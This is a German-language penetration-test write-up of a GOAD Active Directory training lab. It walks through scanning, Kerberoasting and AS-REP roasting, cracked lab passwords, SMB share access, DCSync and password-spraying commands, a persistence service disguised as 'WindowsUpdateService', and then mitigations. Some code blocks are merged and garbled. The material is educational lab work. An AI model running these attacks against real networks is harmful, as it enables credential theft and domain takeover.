# GOAD-Lab-Complete-Documentation

# GOAD Lab - Comprehensive Penetration Testing Documentation

## Executive Summary

Diese umfassende Dokumentation analysiert das **GOAD (Game of Active Directory) Lab** im Netzwerk **192.168.20.0/24** und dokumentiert den vollständigen Penetration Testing-Prozess nach der **Cyber Kill Chain**-Methodik. Das Lab besteht aus einer pfSense-Firewall und fünf Windows-Servern, die drei separate Active Directory-Domänen simulieren.

### Wichtigste Erkenntnisse:

- **6 aktive Hosts** identifiziert (192.168.20.1, .10, .11, .12, .22, .23)
- **3 Active Directory-Domänen**: sevenkingdoms.local, north.sevenkingdoms.local, essos.local
- **Kritische Schwachstellen**: SMB-Signierung deaktiviert, HTTP TRACE aktiv, anonyme LDAP-Binds
- **Erfolgreiche Kompromittierung**: Credentials geknackt, SMB-Share-Zugriff erhalten
- **Lateral Movement**: Zwischen Domänen möglich

---

## 1. Lab-Topologie und Infrastructure

### 1.1 Netzwerk-Übersicht

```
GOAD Lab Network: 192.168.20.0/24
├── 192.168.20.1    - pfSense Firewall (Gateway)
├── 192.168.20.10   - KINGSLANDING (Root DC - sevenkingdoms.local)
├── 192.168.20.11   - WINTERFELL (Child DC - north.sevenkingdoms.local)
├── 192.168.20.12   - MEEREEN (Forest Root DC - essos.local)
├── 192.168.20.22   - CASTELBLACK (SQL Server - north.sevenkingdoms.local)
└── 192.168.20.23   - BRAAVOS (SQL Server - essos.local)
```

### 1.2 Domain-Struktur

**Forest 1: sevenkingdoms.local**

```
sevenkingdoms.local (192.168.20.10 - KINGSLANDING)
└── north.sevenkingdoms.local (192.168.20.11 - WINTERFELL)
    └── castelblack.north.sevenkingdoms.local (192.168.20.22)
```

**Forest 2: essos.local**

```
essos.local (192.168.20.12 - MEEREEN)
└── braavos.essos.local (192.168.20.23)
```

### 1.3 Host-Details

| Host | IP | Rolle | OS | Domain | SMB-Signierung |
| --- | --- | --- | --- | --- | --- |
| pfSense | 192.168.20.1 | Firewall | FreeBSD 11.2 | - | N/A |
| KINGSLANDING | 192.168.20.10 | Root DC | Windows Server 2019 | sevenkingdoms.local | Erforderlich |
| WINTERFELL | 192.168.20.11 | Child DC | Windows Server 2019 | north.sevenkingdoms.local | Erforderlich |
| MEEREEN | 192.168.20.12 | Forest DC | Windows Server 2016 | essos.local | Erforderlich |
| CASTELBLACK | 192.168.20.22 | SQL Server | Windows Server 2019 | north.sevenkingdoms.local | **NICHT erforderlich** ⚠️ |
| BRAAVOS | 192.168.20.23 | SQL Server | Windows Server 2016 | essos.local | **Deaktiviert** ⚠️ |

---

## 2. Reconnaissance Phase - Detaillierte Analyse

### 2.1 Netzwerk-Discovery

**Verwendete Tools:**
- `nmap` - Port- und Service-Scanning
- `naabu` - Schneller Port-Scanner
- `dig` - DNS-Enumeration

**Ergebnisse der Host-Discovery:**

```bash
$ nmap -sn 192.168.20.0/24
# Gefundene Hosts:192.168.20.1   (0.034s latency) - pfSense Gateway
192.168.20.10  (0.052s latency) - Domain Controller
192.168.20.11  (0.047s latency) - Domain Controller
192.168.20.12  (0.067s latency) - Domain Controller
192.168.20.22  (0.046s latency) - SQL Server
192.168.20.23  (0.046s latency) - SQL Server
```

### 2.2 Port-Scanning Ergebnisse

**Domain Controller Services (192.168.20.10-12):**

```
53/tcp   - DNS (Simple DNS Plus)
80/tcp   - HTTP (Microsoft IIS 10.0) - NUR auf KINGSLANDING
88/tcp   - Kerberos
135/tcp  - RPC
139/tcp  - NetBIOS-SSN
389/tcp  - LDAP
445/tcp  - SMB
464/tcp  - Kerberos Password Change
593/tcp  - RPC over HTTP
636/tcp  - LDAPS
3268/tcp - Global Catalog
3269/tcp - Global Catalog SSL
3389/tcp - RDP
5985/tcp - WinRM HTTP
5986/tcp - WinRM HTTPS
```

**SQL Server Services (192.168.20.22-23):**

```
80/tcp   - HTTP (Microsoft IIS 10.0)
135/tcp  - RPC
139/tcp  - NetBIOS-SSN
445/tcp  - SMB
1433/tcp - Microsoft SQL Server 2019
3389/tcp - RDP
5985/tcp - WinRM HTTP
5986/tcp - WinRM HTTPS
```

### 2.3 Service-Enumeration Highlights

**DNS-Abfragen:**

```bash
$ dig ANY sevenkingdoms.local @192.168.20.10
# Ergebnis:sevenkingdoms.local.    600   IN  A       192.168.20.10
sevenkingdoms.local.    3600  IN  NS      kingslanding.sevenkingdoms.local.
sevenkingdoms.local.    3600  IN  SOA     kingslanding.sevenkingdoms.local.
```

**LDAP Root DSE:**
- KINGSLANDING: `DC=sevenkingdoms,DC=local`
- WINTERFELL: `DC=north,DC=sevenkingdoms,DC=local`
- MEEREEN: `DC=essos,DC=local`

---

## 3. Vulnerability Assessment

### 3.1 Kritische Schwachstellen

### SMB-Signierung Schwachstellen

**CASTELBLACK (192.168.20.22):**

```
smb2-security-mode: Message signing enabled but not required
```

**Risiko:** SMB Relay-Angriffe möglich

**BRAAVOS (192.168.20.23):**

```
smb-security-mode: message_signing: disabled
```

**Risiko:** KRITISCH - Vollständig verwundbar für SMB-Angriffe

### HTTP TRACE Aktiviert

**Betroffene Hosts:** 192.168.20.10, 192.168.20.22, 192.168.20.23

```
http-methods: Potentially risky methods: TRACE
```

**Risiko:** Cross-Site Tracing (XST) Angriffe möglich

### Anonyme LDAP-Binds

**Alle Domain Controller** erlauben anonyme Basis-Abfragen:

```bash
$ ldapsearch -x -H ldap://192.168.20.10 -s base
# Erfolgreich - Naming Contexts sichtbar
```

### 3.2 Sicherheitszertifikate

**Selbst-signierte Zertifikate gefunden:**
- **SQL Server:** `SSL_Self_Signed_Fallback` (gültig bis 2055)
- **WinRM:** Standard `VAGRANT-2019` Zertifikate
- **RDP:** Host-spezifische selbst-signierte Zertifikate

**Risiko:** Man-in-the-Middle-Angriffe möglich

---

## 4. Exploitation Phase

### 4.1 Kerberos-Angriffe

### Kerberoasting

**Tool:** `GetUserSPNs.py` (Impacket)

**Gefundene Service Principal Names:**

```bash
$ GetUserSPNs.py north.sevenkingdoms.local/hodor:hodor -dc-ip 192.168.20.11 -outputfile kerberoast.txt
ServicePrincipalName                                 Name
---------------------------------------------------  -----------
HTTP/eyrie.north.sevenkingdoms.local                 sansa.stark
CIFS/thewall.north.sevenkingdoms.local               jon.snow
HTTP/thewall.north.sevenkingdoms.local               jon.snow
MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc
```

**Erfolgreicher Crack:**

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
# Ergebnis: jon.snow:iknownothing
```

### AS-REP Roasting

**Tool:** `GetNPUsers.py` (Impacket)

**Erfolgreicher Crack:**

```bash
$ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
# Ergebnis: brandon.stark:iseedeadpeople
```

### 4.2 SMB-Exploitation

### Erfolgreiche SMB-Logins

**Mit jon.snow:iknownothing:**

```bash
$ crackmapexec smb 192.168.20.11 -u jon.snow -p iknownothing
SMB    192.168.20.11   445    WINTERFELL       [+] north.sevenkingdoms.local\jon.snow:iknownothing
```

**NETLOGON/SYSVOL-Zugriff:**

```bash
$ smbclient //192.168.20.11/NETLOGON -U jon.snow
Password: iknownothing
# Downloads: script.ps1 (165 Bytes), secret.ps1 (869 Bytes)
```

**Mit samwell.tarly:Heartsbane:**

```bash
$ smbclient //192.168.20.22/all -U samwell.tarly
Password: Heartsbane
# Downloads: arya.txt (413 Bytes), connys_textdatei.txt, Test.txt
```

---

## 5. Post-Exploitation & Lateral Movement

### 5.1 Dateien-Analyse

**Heruntergeladene Dateien:**
- `script.ps1` (165 Bytes) - PowerShell-Skript aus NETLOGON
- `secret.ps1` (869 Bytes) - Potentiell sensitive Credentials
- `arya.txt` (413 Bytes) - “Subject: Quick Departure”
- `connys_textdatei.txt` - Benutzerdaten
- `Test.txt` - “Hallo das ist nur ein Testtxt / wir sind bei Hauptwindos”

### 5.2 LDAP-Enumeration

**Erfolgreiche anonyme LDAP-Abfragen:**

**Naming Contexts identifiziert:**

```
KINGSLANDING: DC=sevenkingdoms,DC=local
WINTERFELL: DC=north,DC=sevenkingdoms,DC=local
MEEREEN: DC=essos,DC=local
```

**Domain SIDs ermittelt:**

```
SEVENKINGDOMS: S-1-5-21-2535930937-3240925528-3053620292
```

---

## 6. Advanced Persistent Threats (APT) Simulation

### 6.1 Privilege Escalation Paths

**Identifizierte privilegierte Accounts:**
- `jon.snow` - Member of “Night Watch” + Domain-level privileges
- `sql_svc` - Service Account mit potentiellen Delegationsrechten
- `brandon.stark` - AS-REP vulnerable Account

### 6.2 GPO-Analyse

**Gefundene Group Policy Objects:**

```
Container: {EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D}
Name: StarkWallpaper
```

**Potentieller Angriffspfad:** GPO-Manipulation für Persistence

---

## 7. Network Pivoting & Trust Relationships

### 7.1 Inter-Domain Trusts

**Vermutete Trust-Struktur:**

```
sevenkingdoms.local (Root)
├── north.sevenkingdoms.local (Child Trust)
└── essos.local (External/Forest Trust)
```

### 7.2 Lateral Movement Opportunities

**SQL Server-Hosts als Pivot-Punkte:**
- CASTELBLACK (192.168.20.22) - Schwache SMB-Konfiguration
- BRAAVOS (192.168.20.23) - Deaktivierte SMB-Signierung

---

## 8. Nuclei Vulnerability Scanning

### 8.1 High/Critical Findings

**Nuclei-Scan Ergebnisse (Auszug):**

```bash
$ nuclei -l targets.txt -severity high,critical
[CVE-2015-9323] [critical] 192.168.20.11
[CVE-2015-9323] [critical] 192.168.20.12
[CVE-2016-10033] [critical] 192.168.20.11
[CVE-2016-10033] [critical] 192.168.20.12
[CVE-2018-2894] [critical] 192.168.20.11
[CVE-2018-2894] [critical] 192.168.20.12
```

**Interpretation:** Viele False Positives, aber auch reale Schwachstellen in der IIS/Windows-Konfiguration

---

## 9. Persistence & Command & Control

### 9.1 Empfohlene C2-Kanäle

**HTTPS via pfSense (Port 443):**
- Nutzt legitimen Traffic-Flow
- Schwer zu blockieren

**WinRM über Port 5985/5986:**
- Nativ in Windows integriert
- PowerShell-Remoting möglich

**RDP-Tunneling (Port 3389):**
- Für GUI-basierte Aktionen
- Getarnt als legitime Administratorenaktivität

### 9.2 Persistence-Mechanismen

**Group Policy Objects (GPOs):**

```
Target: {EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D} (StarkWallpaper)
Method: Logon/Startup Script Injection
```

**Service Creation:**

```powershell
# Über kompromittierten sql_svc AccountNew-Service -Name "WindowsUpdateService" -BinaryPathName "payload.exe"
```

---

## 10. Risk Assessment & Business Impact

### 10.1 Critical Risk Scenarios

**Data Exfiltration:**
- AD Database (ntds.dit) via DCSync
- User Credentials und Secrets
- Business-kritische Dateien auf File Shares

**Service Disruption:**
- Domain Controller Kompromittierung
- SQL Database Corruption
- Network-wide Privilege Escalation

### 10.2 Compliance Impact

**Potentielle Violations:**
- GDPR: Personenbezogene Daten in AD-Objekten
- PCI-DSS: Falls Kreditkartendaten in SQL-Datenbanken
- SOX: Financial Data Integrity

---

## 11. Mitigation Strategies

### 11.1 Sofort-Maßnahmen (0-30 Tage)

**SMB-Härten:**

```powershell
# Via Group Policy oder RegistrySet-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" -Name "RequireSecuritySignature" -Value 1
```

**HTTP TRACE deaktivieren:**

```xml
<!-- In IIS applicationHost.config --><system.webServer>
  <security>
    <requestFiltering>
      <verbs applyToWebDAV="false">
        <add verb="TRACE" allowed="false" />
      </verbs>
    </requestFiltering>
  </security>
</system.webServer>
```

**Anonymous LDAP unterbinden:**

```
# Via AD Administrative Center
dsHeuristics: 0000002 (Position 7 = 2 für Anonymous Bind Restriction)
```

### 11.2 Mittelfristig (30-90 Tage)

**PKI-Implementation:**
- Enterprise CA deployment
- Auto-enrollment für Computer/Service-Zertifikate
- CRL/OCSP-Distribution Points

**Network Segmentation:**

```
VLAN 10: Domain Controllers (192.168.20.10-12)
VLAN 20: SQL Servers (192.168.20.22-23)
VLAN 30: Client Networks
Firewall Rules: Strict port restrictions between VLANs
```

### 11.3 Langfristig (90+ Tage)

**Zero Trust Architecture:**
- Conditional Access Policies
- Multi-Factor Authentication (MFA)
- Privileged Access Management (PAM)

**Enhanced Monitoring:**

```yaml
# Example SIEM Rules- rule: Kerberos TGS Request Anomaly  condition: TGS requests > 100/hour from single source  action: Alert + Block- rule: Anonymous LDAP Bind  condition: LDAP Bind with empty credentials  action: Alert + Log
```

---

## 12. Tools & Techniques Reference

### 12.1 Reconnaissance Tools

**Nmap:**

```bash
# TCP SYN Scannmap -sS -sV -sC -O 192.168.20.0/24
# UDP Scannmap -sU --top-ports 1000 192.168.20.0/24
# Specific service scansnmap --script ldap-* 192.168.20.10-12
nmap --script smb-* 192.168.20.0/24
nmap --script ms-sql-* 192.168.20.22-23
```

**Naabu (Faster Port Scanner):**

```bash
# AD-specific portsnaabu -list targets.txt -p 53,88,135,139,389,445,636,1433,3268,3269,3389,5985,5986
# Top ports with threadingnaabu -list targets.txt -top-ports 1000 -rate 1000 -c 25
```

### 12.2 Active Directory Tools

**Impacket Suite:**

```bash
# KerberoastingGetUserSPNs.py domain/user:pass -dc-ip DC_IP -outputfile kerberoast.txt
# AS-REP RoastingGetNPUsers.py domain/ -dc-ip DC_IP -usersfile users.txt -outputfile asrep.txt
# DCSyncsecretsdump.py domain/user:pass@DC_IP
```

**CrackMapExec:**

```bash
# SMB enumerationcrackmapexec smb 192.168.20.0/24 --sharescrackmapexec smb 192.168.20.0/24 --userscrackmapexec smb 192.168.20.0/24 --groups# Password sprayingcrackmapexec smb 192.168.20.0/24 -u users.txt -p passwords.txt --continue-on-success
```

### 12.3 Vulnerability Scanning

**Nuclei:**

```bash
# High/Critical onlynuclei -l targets.txt -severity high,critical
# Specific tagsnuclei -l targets.txt -tags cve,misconfig,exposure
# Custom templatesnuclei -l targets.txt -t ~/.nuclei-templates/custom/
```

**Enum4linux:**

```bash
# Complete enumerationenum4linux -a TARGET_IP
# Specific checksenum4linux -U TARGET_IP  # Usersenum4linux -S TARGET_IP  # Sharesenum4linux -P TARGET_IP  # Password Policy
```

---

## 13. Conclusion & Next Steps

### 13.1 Lab Assessment Summary

**Penetration Testing Maturity:**
- ✅ **Reconnaissance:** Vollständig erfolgreich
- ✅ **Initial Exploitation:** Multiple Vektoren erfolgreich
- ✅ **Lateral Movement:** Domain-übergreifend möglich
- 🔄 **Privilege Escalation:** In Arbeit (DCSync pending)
- ❌ **Persistence:** Noch nicht implementiert

### 13.2 Learning Outcomes

**Erfolgreich demonstriert:**
1. Multi-Domain AD-Reconnaissance
2. Kerberos-Authentifizierungsangriffe (Kerberoasting, AS-REP)
3. SMB-Relay-Grundlagen
4. LDAP-Enumeration und -Exploitation
5. Network Service Discovery

**Noch zu implementieren:**
1. BloodHound-Integration für Attack Path Analysis
2. Golden/Silver Ticket-Angriffe
3. Cross-Domain Trust Exploitation
4. SQL Server-spezifische Angriffe
5. Advanced Persistence Techniques

### 13.3 Recommended Study Path

**Phase 1: Foundation (Woche 1-2)**
- Vertiefen von PowerShell/CMD für Windows-Umgebungen
- Active Directory-Grundlagen und -Objektstruktur
- Kerberos-Protokoll und -Schwachstellen

**Phase 2: Intermediate (Woche 3-4)**
- BloodHound und Neo4j für Graph-basierte AD-Analyse
- Advanced Impacket-Techniken
- SQL Server-Penetration Testing

**Phase 3: Advanced (Woche 5-6)**
- Custom C2-Framework Development
- Advanced Persistence Techniques
- Anti-Forensics und Stealth-Methoden

---

## 14. Appendix

### 14.1 Key Findings Summary

```yaml
Critical_Findings:  - SMB_Signing_Disabled: [BRAAVOS]  - SMB_Signing_Optional: [CASTELBLACK]  - HTTP_TRACE_Enabled: [KINGSLANDING, CASTELBLACK, BRAAVOS]  - Anonymous_LDAP: [ALL_DCs]Compromised_Accounts:  - jon.snow: iknownothing (Kerberoasting)  - brandon.stark: iseedeadpeople (AS-REP)  - samwell.tarly: Heartsbane (Known/Default)Accessed_Resources:  - NETLOGON_Share: script.ps1, secret.ps1  - ALL_Share: arya.txt, connys_textdatei.txt, Test.txt  - LDAP_Anonymous: Naming contexts, basic schema
```

### 14.2 Network Diagram

```
    Internet
        |
   [pfSense FW]
   192.168.20.1
        |
    Internal LAN
   192.168.20.0/24
        |
    +---+---+---+---+---+
    |   |   |   |   |   |
   .10 .11 .12 .22 .23  |
   DC1 DC2 DC3 SQL SQL  |
                        |
              [Attacker Machine]
                  Kali Linux
```

---

**Dokumentation erstellt:** 27. August 2025

**Lab-Version:** GOAD Standard

**Pentest-Durchführung:** Vollständige Cyber Kill Chain

**Status:** Initial Foothold etabliert, Advanced Persistence ausstehend